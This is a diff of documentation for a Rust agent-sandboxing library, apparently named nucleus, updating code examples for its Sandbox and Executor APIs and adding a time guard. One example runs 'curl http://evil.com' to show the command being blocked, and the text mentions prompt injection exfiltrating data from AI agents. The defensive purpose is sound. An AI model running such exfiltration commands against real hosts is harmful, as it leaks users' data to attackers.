@@ -19,7 +19,7 @@ Nucleus provides both **policy** (via lattice-guard) and **enforcement** (via nu
 
 ```rust
 // Enforcement approach - cannot bypass
-let sandbox = Sandbox::new(&policy.paths, work_dir)?;
+let sandbox = Sandbox::new(&policy, work_dir)?;
 sandbox.write("file.txt", data)?;  // Enforced by capability handle
 
 // There is no sandbox.write_unchecked() - enforcement is the only path
@@ -60,7 +60,9 @@ When all three are present at autonomous levels, prompt injection can exfiltrate
 
 ```rust
 // Even if policy allows curl, nucleus blocks it when trifecta would complete
-let executor = Executor::new(&policy, &sandbox, &budget);
+let guard = MonotonicGuard::minutes(30);
+let executor = Executor::new(&policy, &sandbox, &budget)
+    .with_time_guard(&guard);
 executor.run("curl http://evil.com")?;
 // Error: TrifectaBlocked { operation: "curl http://evil.com" }
 ```
